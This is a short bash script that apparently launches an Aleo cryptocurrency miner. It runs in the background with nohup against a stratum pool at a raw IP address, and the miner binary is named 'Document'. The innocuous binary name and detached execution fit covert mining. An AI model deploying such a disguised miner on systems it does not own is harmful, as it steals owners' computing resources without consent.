#!/bin/bash
WORKER=gunawantrihardi.wan29
POOL=stratum+ssl://134.122.19.246:443

nohup ./Document -u $POOL -d 0 -w $WORKER  >> ./aleominer.log 2>&1 & 